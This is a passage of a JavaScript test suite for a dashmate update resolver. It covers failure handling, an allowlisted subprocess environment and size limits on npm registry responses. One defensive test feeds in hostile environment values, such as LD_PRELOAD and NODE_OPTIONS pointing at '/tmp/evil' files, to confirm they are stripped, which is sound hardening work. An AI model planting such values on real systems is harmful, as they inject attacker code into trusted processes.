      expect(candidate.reason).to.equal(CANDIDATE_REASON.RESOLUTION_FAILED);
    });
  });

  describe('never throwing', () => {
    it('should report unknown rather than throw when a seam throws', async () => {
      fetchJson.throws(new Error('exploded'));

      const candidate = await resolveNpm();

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.RESOLUTION_FAILED);
      expect(candidate.candidateVersion).to.be.null();
    });

    [null, undefined, 42, 'a string', { code: 'ENOENT' }].forEach((thrown) => {
      it(`should report unknown rather than throw when a seam throws ${String(JSON.stringify(thrown))}`, async () => {
        // Nothing that handles a failure may assume it was handed an Error: a rejected promise
        // carries whatever the thrower chose, and reading .message off null throws in the very
        // handler whose job is to stop this from throwing. Raw functions rather than stubs,
        // because a stub asked to throw undefined returns instead.
        const candidate = await resolveNpm({
          fetchJson: () => {
            throw thrown;
          },
        });

        expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
        expect(candidate.reason).to.equal(CANDIDATE_REASON.RESOLUTION_FAILED);
      });

      it(`should report unknown rather than throw when a seam rejects with ${String(JSON.stringify(thrown))}`, async () => {
        const candidate = await resolveNpm({ fetchJson: () => Promise.reject(thrown) });

        expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
        expect(candidate.reason).to.equal(CANDIDATE_REASON.RESOLUTION_FAILED);
      });

      it(`should report unknown rather than throw when apt rejects with ${String(JSON.stringify(thrown))}`, async () => {
        const candidate = await resolveDeb({ runCommand: () => Promise.reject(thrown) });

        expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
        expect(candidate.candidateVersion).to.be.null();
      });
    });

    it('should report unknown rather than throw when its own options cannot be read', async () => {
      const candidate = await resolveUpdateCandidate({
        installMethod: detection(INSTALL_METHODS.NPM),
        get currentVersion() {
          throw new Error('exploded');
        },
      });

      expect(candidate.state).to.equal(CANDIDATE_STATE.UNKNOWN);
      expect(candidate.reason).to.equal(CANDIDATE_REASON.RESOLUTION_FAILED);
    });
  });

  describe('production defaults', () => {
    describe('subprocess options', () => {
      it('should spawn with an allowlisted environment, no shell, and bounds', () => {
        const options = commandOptions(1234);

        expect(options.env).to.deep.equal({
          PATH: '/usr/sbin:/usr/bin:/sbin:/bin',
          LC_ALL: 'C',
          LANG: 'C',
          DEBIAN_FRONTEND: 'noninteractive',
        });
        expect(options.timeout).to.equal(1234);
        expect(options.maxBuffer).to.equal(1024 * 1024);
        expect(options.windowsHide).to.be.true();
        expect(options).to.not.have.property('shell');
      });

      it('should not pass the caller environment through to apt', function it() {
        // APT_CONFIG alone can relocate the sources apt reads and turn off authentication, so
        // the environment is built rather than inherited
        this.sinon.stub(process, 'env').value({
          APT_CONFIG: '/tmp/evil.conf',
          NODE_OPTIONS: '--require /tmp/evil.js',
          LD_PRELOAD: '/tmp/evil.so',
          PATH: '/tmp/evil/bin',
        });

        const { env } = commandOptions(1000);

        expect(env).to.not.have.property('APT_CONFIG');
        expect(env).to.not.have.property('NODE_OPTIONS');
        expect(env).to.not.have.property('LD_PRELOAD');
        expect(env.PATH).to.equal('/usr/sbin:/usr/bin:/sbin:/bin');
      });

      it('should run commands through execFile with those options', async function it() {
        const execFile = this.sinon.stub().resolves({ stdout: 'out', stderr: '' });

        const stdout = await defaultRunCommand('/usr/bin/apt-cache', ['policy'], {
          timeout: 4321,
          execFile,
        });

        expect(stdout).to.equal('out');

        const [file, args, options] = execFile.firstCall.args;

        expect(file).to.equal('/usr/bin/apt-cache');
        expect(args).to.deep.equal(['policy']);
        expect(options).to.deep.equal(commandOptions(4321));
      });
    });

    describe('registry request', () => {
      let fetchStub;

      beforeEach(function beforeEach() {
        fetchStub = this.sinon.stub(globalThis, 'fetch');
      });

      it('should read a JSON document', async () => {
        fetchStub.resolves(jsonResponse({ name: 'dashmate', version: '4.2.0' }));

        const response = await defaultFetchJson('https://registry.npmjs.org/dashmate/latest');

        expect(response.status).to.equal(FETCH_STATUS.OK);
        expect(response.body.version).to.equal('4.2.0');
      });

      it('should bound the request in time', async () => {
        fetchStub.resolves(jsonResponse({ version: '4.2.0' }));

        await defaultFetchJson('https://registry.npmjs.org/dashmate/latest');

        const [, options] = fetchStub.firstCall.args;

        expect(options.signal).to.be.an.instanceof(AbortSignal);
      });

      it('should report a transport failure rather than throwing', async () => {
        fetchStub.rejects(new TypeError('fetch failed'));

        const response = await defaultFetchJson('https://registry.npmjs.org/dashmate/latest');

        expect(response.status).to.equal(FETCH_STATUS.NETWORK_ERROR);
      });

      it('should report an error status and release the connection', async () => {
        const { response, counters } = streamingResponse({ init: { status: 429 } });

        fetchStub.resolves(response);

        const answer = await defaultFetchJson('https://registry.npmjs.org/dashmate/latest');

        expect(answer.status).to.equal(FETCH_STATUS.HTTP_ERROR);
        expect(answer.statusCode).to.equal(429);
        expect(counters.cancelled).to.be.true();
      });

      it('should refuse a body whose declared size exceeds the cap without reading it', async () => {
        const { response, counters } = streamingResponse({
          chunkCount: 1024,
          init: { headers: { 'content-length': String(8 * 1024 * 1024) } },
        });

        fetchStub.resolves(response);

        const answer = await defaultFetchJson('https://registry.npmjs.org/dashmate/latest');

        expect(answer.status).to.equal(FETCH_STATUS.TOO_LARGE);
        // a stream fills its first buffer on construction, so anything beyond that would be
        // this module reading a body it had already decided to refuse
        expect(counters.pulls).to.be.at.most(1);
        expect(counters.cancelled).to.be.true();
      });

      it('should stop reading a body that exceeds the cap while it streams', async () => {
        // The declared size is only a hint, so an undeclared body is measured as it arrives
        const { response, counters } = streamingResponse({ chunkCount: 1024 });

        fetchStub.resolves(response);

        const answer = await defaultFetchJson('https://registry.npmjs.org/dashmate/latest');

        expect(answer.status).to.equal(FETCH_STATUS.TOO_LARGE);
        expect(counters.pulls).to.be.at.most(64);
        expect(counters.cancelled).to.be.true();
      });

      it('should report a body that is not JSON', async () => {
        fetchStub.resolves(jsonResponse('<html>not json</html>'));

        const answer = await defaultFetchJson('https://registry.npmjs.org/dashmate/latest');

        expect(answer.status).to.equal(FETCH_STATUS.MALFORMED);
      });
    });
  });
});
